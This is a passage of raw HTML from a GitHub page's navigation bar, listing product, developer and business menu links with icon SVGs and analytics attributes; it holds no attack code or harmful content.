class="Container__emC4mW"><button type="button" class="Button__wfsCbG" aria-expanded="false" aria-controls="_R_nd_">Products<svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-triangle-right ButtonIcon__jioMke" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m6.427 4.427 3.396 3.396a.25.25 0 0 1 0 .354l-3.396 3.396A.25.25 0 0 1 6 11.396V4.604a.25.25 0 0 1 .427-.177Z"></path></svg></button><div id="_R_nd_" class="Dropdown__mIjZVL"><div class="Panel__x1katk featuredFirst__wlyFSS"><ul class="Groups__weN4wF"><li class="GroupCell__3rf5gs featured__8zdr8E"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX visually-hidden" id="_R_5knd_">Platform</span><ul class="LinkList__vQ9yLT IconList__WlH-sM" aria-labelledby="_R_5knd_"><li><a href="https://github.com/platform" data-analytics-event="{&quot;action&quot;:&quot;github&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;products&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;github_link_products_navbar&quot;}" class="Link__Q0qcrF Card__w-iBF7"><span class="Thumbnail__vqvSAN" aria-hidden="true"><img src="https://github.githubassets.com/assets/platform-4ce65ae0bf273ce2.png" alt="" width="240" height="150" class="LightImage__i9mM_d"/><img src="https://github.githubassets.com/assets/platform-dark-ac89fbf373737ed3.png" alt="" width="240" height="150" class="DarkImage__B4rswp"/></span><span class="Icon__xpGsPX"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-stack" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M7.122.392a1.75 1.75 0 0 1 1.756 0l5.003 2.902c.83.481.83 1.68 0 2.162L8.878 8.358a1.75 1.75 0 0 1-1.756 0L2.119 5.456a1.251 1.251 0 0 1 0-2.162ZM8.125 1.69a.248.248 0 0 0-.25 0l-4.63 2.685 4.63 2.685a.248.248 0 0 0 .25 0l4.63-2.685ZM1.601 7.789a.75.75 0 0 1 1.025-.273l5.249 3.044a.248.248 0 0 0 .25 0l5.249-3.044a.75.75 0 0 1 .752 1.298l-5.248 3.044a1.75 1.75 0 0 1-1.756 0L1.874 8.814A.75.75 0 0 1 1.6 7.789Zm0 3.5a.75.75 0 0 1 1.025-.273l5.249 3.044a.248.248 0 0 0 .25 0l5.249-3.044a.75.75 0 0 1 .752 1.298l-5.248 3.044a1.75 1.75 0 0 1-1.756 0l-5.248-3.044a.75.75 0 0 1-.273-1.025Z"></path></svg></span><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">GitHub</span></span><span class="Subtitle__DzvloX">Repository hosting, code review, and collaboration</span></span></a></li><li><a href="https://github.com/features/copilot" data-analytics-event="{&quot;action&quot;:&quot;copilot&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;products&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;copilot_link_products_navbar&quot;}" class="Link__Q0qcrF Card__w-iBF7"><span class="Thumbnail__vqvSAN" aria-hidden="true"><img src="https://github.githubassets.com/assets/copilot-e2b89335a66dba00.png" alt="" width="240" height="150" class="LightImage__i9mM_d"/><img src="https://github.githubassets.com/assets/copilot-dark-2b28403b6080e898.png" alt="" width="240" height="150" class="DarkImage__B4rswp"/></span><span class="Icon__xpGsPX"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-copilot" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M7.998 15.035c-4.562 0-7.873-2.914-7.998-3.749V9.338c.085-.628.677-1.686 1.588-2.065.013-.07.024-.143.036-.218.029-.183.06-.384.126-.612-.201-.508-.254-1.084-.254-1.656 0-.87.128-1.769.693-2.484.579-.733 1.494-1.124 2.724-1.261 1.206-.134 2.262.034 2.944.765.05.053.096.108.139.165.044-.057.094-.112.143-.165.682-.731 1.738-.899 2.944-.765 1.23.137 2.145.528 2.724 1.261.566.715.693 1.614.693 2.484 0 .572-.053 1.148-.254 1.656.066.228.098.429.126.612.012.076.024.148.037.218.924.385 1.522 1.471 1.591 2.095v1.872c0 .766-3.351 3.795-8.002 3.795Zm0-1.485c2.28 0 4.584-1.11 5.002-1.433V7.862l-.023-.116c-.49.21-1.075.291-1.727.291-1.146 0-2.059-.327-2.71-.991A3.222 3.222 0 0 1 8 6.303a3.24 3.24 0 0 1-.544.743c-.65.664-1.563.991-2.71.991-.652 0-1.236-.081-1.727-.291l-.023.116v4.255c.419.323 2.722 1.433 5.002 1.433ZM6.762 2.83c-.193-.206-.637-.413-1.682-.297-1.019.113-1.479.404-1.713.7-.247.312-.369.789-.369 1.554 0 .793.129 1.171.308 1.371.162.181.519.379 1.442.379.853 0 1.339-.235 1.638-.54.315-.322.527-.827.617-1.553.117-.935-.037-1.395-.241-1.614Zm4.155-.297c-1.044-.116-1.488.091-1.681.297-.204.219-.359.679-.242 1.614.091.726.303 1.231.618 1.553.299.305.784.54 1.638.54.922 0 1.28-.198 1.442-.379.179-.2.308-.578.308-1.371 0-.765-.123-1.242-.37-1.554-.233-.296-.693-.587-1.713-.7Z"></path><path d="M6.25 9.037a.75.75 0 0 1 .75.75v1.501a.75.75 0 0 1-1.5 0V9.787a.75.75 0 0 1 .75-.75Zm4.25.75v1.501a.75.75 0 0 1-1.5 0V9.787a.75.75 0 0 1 1.5 0Z"></path></svg></span><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Copilot</span></span><span class="Subtitle__DzvloX">AI coding agent for tasks, projects, and automated work</span></span></a></li></ul></div></li><li class="GroupCell__3rf5gs"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX" id="_R_9knd_">Build &amp; Ship</span><ul class="LinkList__vQ9yLT IconList__WlH-sM" aria-labelledby="_R_9knd_"><li><a href="https://github.com/features/actions" data-analytics-event="{&quot;action&quot;:&quot;actions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;products&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;actions_link_products_navbar&quot;}" class="Link__Q0qcrF"><span class="Icon__xpGsPX"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-workflow" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M0 1.75C0 .784.784 0 1.75 0h3.5C6.216 0 7 .784 7 1.75v3.5A1.75 1.75 0 0 1 5.25 7H4v4a1 1 0 0 0 1 1h4v-1.25C9 9.784 9.784 9 10.75 9h3.5c.966 0 1.75.784 1.75 1.75v3.5A1.75 1.75 0 0 1 14.25 16h-3.5A1.75 1.75 0 0 1 9 14.25v-.75H5A2.5 2.5 0 0 1 2.5 11V7h-.75A1.75 1.75 0 0 1 0 5.25Zm1.75-.25a.25.25 0 0 0-.25.25v3.5c0 .138.112.25.25.25h3.5a.25.25 0 0 0 .25-.25v-3.5a.25.25 0 0 0-.25-.25Zm9 9a.25.25 0 0 0-.25.25v3.5c0 .138.112.25.25.25h3.5a.25.25 0 0 0 .25-.25v-3.5a.25.25 0 0 0-.25-.25Z"></path></svg></span><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Actions</span></span><span class="Subtitle__DzvloX">CI/CD and automation</span></span></a></li><li><a href="https://github.com/features/code-quality" data-analytics-event="{&quot;action&quot;:&quot;code_quality&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;products&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;code_quality_link_products_navbar&quot;}" class="Link__Q0qcrF"><span class="Icon__xpGsPX"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-codescan" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M5.47 5.22a.75.75 0 1 1 1.06 1.06L5.31 7.5l1.22 1.22a.75.75 0 1 1-1.06 1.06L3.72 8.03a.75.75 0 0 1 0-1.06zm3 0a.75.75 0 0 1 1.06 0l1.75 1.75a.75.75 0 0 1 0 1.06L9.53 9.78a.75.75 0 1 1-1.06-1.06L9.69 7.5 8.47 6.28a.75.75 0 0 1 0-1.06"></path><path fill-rule="evenodd" d="M7.5 0a7.5 7.5 0 0 1 5.808 12.246l2.472 2.474a.75.75 0 1 1-1.06 1.06l-2.474-2.472A7.5 7.5 0 1 1 7.5 0m0 1.5a6 6 0 1 0 4.094 10.387.75.75 0 0 1 .293-.293A6 6 0 0 0 7.5 1.5"></path></svg></span><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Code Quality</span></span><span class="Subtitle__DzvloX">Quality analysis, fixes, and enforcement</span></span></a></li><li><a href="https://github.com/features/codespaces" data-analytics-event="{&quot;action&quot;:&quot;codespaces&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;products&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;codespaces_link_products_navbar&quot;}" class="Link__Q0qcrF"><span class="Icon__xpGsPX"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-codespaces" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M0 11.25c0-.966.784-1.75 1.75-1.75h12.5c.966 0 1.75.784 1.75 1.75v3A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25Zm2-9.5C2 .784 2.784 0 3.75 0h8.5C13.216 0 14 .784 14 1.75v5a1.75 1.75 0 0 1-1.75 1.75h-8.5A1.75 1.75 0 0 1 2 6.75Zm1.75-.25a.25.25 0 0 0-.25.25v5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-5a.25.25 0 0 0-.25-.25Zm-2 9.5a.25.25 0 0 0-.25.25v3c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-3a.25.25 0 0 0-.25-.25Z"></path><path d="M7 12.75a.75.75 0 0 1 .75-.75h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1-.75-.75Zm-4 0a.75.75 0 0 1 .75-.75h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1-.75-.75Z"></path></svg></span><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Codespaces</span></span><span class="Subtitle__DzvloX">Cloud development environments</span></span></a></li></ul></div></li><li class="GroupCell__3rf5gs"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX" id="_R_dknd_">Secure</span><ul class="LinkList__vQ9yLT IconList__WlH-sM" aria-labelledby="_R_dknd_"><li><a href="https://github.com/security/advanced-security/code-security" data-analytics-event="{&quot;action&quot;:&quot;code_security&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;products&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;code_security_link_products_navbar&quot;}" class="Link__Q0qcrF"><span class="Icon__xpGsPX"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-code-square" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M5.97 5.72a.75.75 0 1 1 1.06 1.06L5.81 8l1.22 1.22a.75.75 0 1 1-1.06 1.06L4.22 8.53a.75.75 0 0 1 0-1.06zm3 0a.75.75 0 0 1 1.06 0l1.75 1.75a.75.75 0 0 1 0 1.06l-1.75 1.75a.75.75 0 1 1-1.06-1.06L10.19 8 8.97 6.78a.75.75 0 0 1 0-1.06"></path><path fill-rule="evenodd" d="M13.25 1c.966 0 1.75.784 1.75 1.75v10.5A1.75 1.75 0 0 1 13.25 15H2.75A1.75 1.75 0 0 1 1 13.25V2.75C1 1.784 1.784 1 2.75 1zM2.75 2.5a.25.25 0 0 0-.25.25v10.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25V2.75a.25.25 0 0 0-.25-.25z"></path></svg></span><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Code Security</span></span><span class="Subtitle__DzvloX">Vulnerability detection and remediation</span></span></a></li><li><a href="https://github.com/security/advanced-security/secret-protection" data-analytics-event="{&quot;action&quot;:&quot;secret_protection&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;products&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;secret_protection_link_products_navbar&quot;}" class="Link__Q0qcrF"><span class="Icon__xpGsPX"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-shield-lock" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m8.533.133 5.25 1.68A1.75 1.75 0 0 1 15 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.697 1.697 0 0 1-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 0 1 1.217-1.667l5.25-1.68a1.748 1.748 0 0 1 1.066 0Zm-.61 1.429.001.001-5.25 1.68a.251.251 0 0 0-.174.237V7c0 1.36.275 2.666 1.057 3.859.784 1.194 2.121 2.342 4.366 3.298a.196.196 0 0 0 .154 0c2.245-.957 3.582-2.103 4.366-3.297C13.225 9.666 13.5 8.358 13.5 7V3.48a.25.25 0 0 0-.174-.238l-5.25-1.68a.25.25 0 0 0-.153 0ZM9.5 6.5c0 .536-.286 1.032-.75 1.3v2.45a.75.75 0 0 1-1.5 0V7.8A1.5 1.5 0 1 1 9.5 6.5Z"></path></svg></span><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Secret Protection</span></span><span class="Subtitle__DzvloX">Secret scanning and leak prevention</span></span></a></li></ul></div></li></ul><div class="Footer__yLWpl0"><a href="https://github.com/features" data-analytics-event="{&quot;action&quot;:&quot;all_features&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;products&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;all_features_link_products_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">All Features</span><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-chevron-right Arrow__Um9le0" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"></path></svg></span></span></a></div></div></div></div></li><li><div class="Container__emC4mW"><button type="button" class="Button__wfsCbG" aria-expanded="false" aria-controls="_R_17d_">Developers<svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-triangle-right ButtonIcon__jioMke" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m6.427 4.427 3.396 3.396a.25.25 0 0 1 0 .354l-3.396 3.396A.25.25 0 0 1 6 11.396V4.604a.25.25 0 0 1 .427-.177Z"></path></svg></button><div id="_R_17d_" class="Dropdown__mIjZVL"><div class="Panel__x1katk"><ul class="Groups__weN4wF"><li class="GroupCell__3rf5gs"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX" id="_R_5l7d_">Learn</span><ul class="LinkList__vQ9yLT" aria-labelledby="_R_5l7d_"><li><a href="https://docs.github.com/en" data-analytics-event="{&quot;action&quot;:&quot;documentation&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;developers&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;documentation_link_developers_navbar&quot;}" target="_blank" rel="noreferrer" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Documentation</span><svg data-component="Octicon" focusable="false" aria-label="(opens in a new tab)" class="octicon octicon-arrow-up-right" role="img" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M4.53 4.75A.75.75 0 0 1 5.28 4h6.01a.75.75 0 0 1 .75.75v6.01a.75.75 0 0 1-1.5 0v-4.2l-5.26 5.261a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L9.48 5.5h-4.2a.75.75 0 0 1-.75-.75Z"></path></svg></span></span></a></li><li><a href="https://learn.github.com/skills" data-analytics-event="{&quot;action&quot;:&quot;training&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;developers&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;training_link_developers_navbar&quot;}" target="_blank" rel="noreferrer" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Training</span><svg data-component="Octicon" focusable="false" aria-label="(opens in a new tab)" class="octicon octicon-arrow-up-right" role="img" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M4.53 4.75A.75.75 0 0 1 5.28 4h6.01a.75.75 0 0 1 .75.75v6.01a.75.75 0 0 1-1.5 0v-4.2l-5.26 5.261a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L9.48 5.5h-4.2a.75.75 0 0 1-.75-.75Z"></path></svg></span></span></a></li><li><a href="https://learn.github.com/credentials" data-analytics-event="{&quot;action&quot;:&quot;certifications&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;developers&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;certifications_link_developers_navbar&quot;}" target="_blank" rel="noreferrer" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Certifications</span><svg data-component="Octicon" focusable="false" aria-label="(opens in a new tab)" class="octicon octicon-arrow-up-right" role="img" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M4.53 4.75A.75.75 0 0 1 5.28 4h6.01a.75.75 0 0 1 .75.75v6.01a.75.75 0 0 1-1.5 0v-4.2l-5.26 5.261a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L9.48 5.5h-4.2a.75.75 0 0 1-.75-.75Z"></path></svg></span></span></a></li></ul></div></li><li class="GroupCell__3rf5gs"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX" id="_R_9l7d_">Build</span><ul class="LinkList__vQ9yLT" aria-labelledby="_R_9l7d_"><li><a href="https://github.com/features/ai" data-analytics-event="{&quot;action&quot;:&quot;build_with_copilot&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;developers&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;build_with_copilot_link_developers_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Build with Copilot</span></span></span></a></li><li><a href="https://docs.github.com/en/copilot/how-tos/copilot-on-github/customize-copilot/customize-copilot-overview" data-analytics-event="{&quot;action&quot;:&quot;customize_copilot&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;developers&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;customize_copilot_link_developers_navbar&quot;}" target="_blank" rel="noreferrer" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Customize Copilot</span><svg data-component="Octicon" focusable="false" aria-label="(opens in a new tab)" class="octicon octicon-arrow-up-right" role="img" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M4.53 4.75A.75.75 0 0 1 5.28 4h6.01a.75.75 0 0 1 .75.75v6.01a.75.75 0 0 1-1.5 0v-4.2l-5.26 5.261a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L9.48 5.5h-4.2a.75.75 0 0 1-.75-.75Z"></path></svg></span></span></a></li><li><a href="https://github.com/marketplace" data-analytics-event="{&quot;action&quot;:&quot;integrations&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;developers&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;integrations_link_developers_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Integrations</span></span></span></a></li></ul></div></li><li class="GroupCell__3rf5gs"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX" id="_R_dl7d_">Explore</span><ul class="LinkList__vQ9yLT" aria-labelledby="_R_dl7d_"><li><a href="https://github.com/trending" data-analytics-event="{&quot;action&quot;:&quot;trending_repos&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;developers&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;trending_repos_link_developers_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Trending repos</span></span></span></a></li><li><a href="https://github.com/open-source/sponsors" data-analytics-event="{&quot;action&quot;:&quot;github_sponsors&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;developers&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;github_sponsors_link_developers_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">GitHub Sponsors</span></span></span></a></li><li><a href="https://github.com/resources/articles" data-analytics-event="{&quot;action&quot;:&quot;developer_articles&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;developers&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;developer_articles_link_developers_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Developer articles</span></span></span></a></li></ul></div></li><li class="GroupCell__3rf5gs featured__8zdr8E"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX visually-hidden" id="_R_hl7d_">Changelog</span><ul class="LinkList__vQ9yLT IconList__WlH-sM" aria-labelledby="_R_hl7d_"><li><a href="https://github.blog/changelog/" data-analytics-event="{&quot;action&quot;:&quot;changelog&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;developers&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;changelog_link_developers_navbar&quot;}" target="_blank" rel="noreferrer" class="Link__Q0qcrF Card__w-iBF7"><span class="Thumbnail__vqvSAN" aria-hidden="true"><img src="https://github.githubassets.com/assets/changelog-fd687bff072883b0.png" alt="" width="240" height="150" class="LightImage__i9mM_d"/><img src="https://github.githubassets.com/assets/changelog-dark-b1c25ae971bd641b.png" alt="" width="240" height="150" class="DarkImage__B4rswp"/></span><span class="Icon__xpGsPX"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-megaphone" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M3.25 9a.75.75 0 0 1 .75.75c0 2.142.456 3.828.733 4.653a.122.122 0 0 0 .05.064.212.212 0 0 0 .117.033h1.31c.085 0 .18-.042.258-.152a.45.45 0 0 0 .075-.366A16.743 16.743 0 0 1 6 9.75a.75.75 0 0 1 1.5 0c0 1.588.25 2.926.494 3.85.293 1.113-.504 2.4-1.783 2.4H4.9c-.686 0-1.35-.41-1.589-1.12A16.4 16.4 0 0 1 2.5 9.75.75.75 0 0 1 3.25 9Z"></path><path d="M0 6a4 4 0 0 1 4-4h2.75a.75.75 0 0 1 .75.75v6.5a.75.75 0 0 1-.75.75H4a4 4 0 0 1-4-4Zm4-2.5a2.5 2.5 0 1 0 0 5h2v-5Z"></path><path d="M15.59.082A.75.75 0 0 1 16 .75v10.5a.75.75 0 0 1-1.189.608l-.002-.001h.001l-.014-.01a5.775 5.775 0 0 0-.422-.25 10.63 10.63 0 0 0-1.469-.64C11.576 10.484 9.536 10 6.75 10a.75.75 0 0 1 0-1.5c2.964 0 5.174.516 6.658 1.043.423.151.787.302 1.092.443V2.014c-.305.14-.669.292-1.092.443C11.924 2.984 9.713 3.5 6.75 3.5a.75.75 0 0 1 0-1.5c2.786 0 4.826-.484 6.155-.957.665-.236 1.154-.47 1.47-.64.144-.077.284-.161.421-.25l.014-.01a.75.75 0 0 1 .78-.061Z"></path></svg></span><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Changelog</span><svg data-component="Octicon" focusable="false" aria-label="(opens in a new tab)" class="octicon octicon-arrow-up-right" role="img" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M4.53 4.75A.75.75 0 0 1 5.28 4h6.01a.75.75 0 0 1 .75.75v6.01a.75.75 0 0 1-1.5 0v-4.2l-5.26 5.261a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L9.48 5.5h-4.2a.75.75 0 0 1-.75-.75Z"></path></svg></span><span class="Subtitle__DzvloX">Your source for the latest features, improvements, and fixes across GitHub products, all in one place.</span></span></a></li></ul></div></li></ul></div></div></div></li><li><div class="Container__emC4mW"><button type="button" class="Button__wfsCbG" aria-expanded="false" aria-controls="_R_1nd_">Businesses<svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-triangle-right ButtonIcon__jioMke" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m6.427 4.427 3.396 3.396a.25.25 0 0 1 0 .354l-3.396 3.396A.25.25 0 0 1 6 11.396V4.604a.25.25 0 0 1 .427-.177Z"></path></svg></button><div id="_R_1nd_" class="Dropdown__mIjZVL"><div class="Panel__x1katk"><ul class="Groups__weN4wF"><li class="GroupCell__3rf5gs"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX" id="_R_5lnd_">By Stage</span><ul class="LinkList__vQ9yLT" aria-labelledby="_R_5lnd_"><li><a href="https://github.com/enterprise" data-analytics-event="{&quot;action&quot;:&quot;enterprises&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;enterprises_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Enterprises</span></span></span></a></li><li><a href="https://github.com/team" data-analytics-event="{&quot;action&quot;:&quot;team&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;team_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Team</span></span></span></a></li><li><a 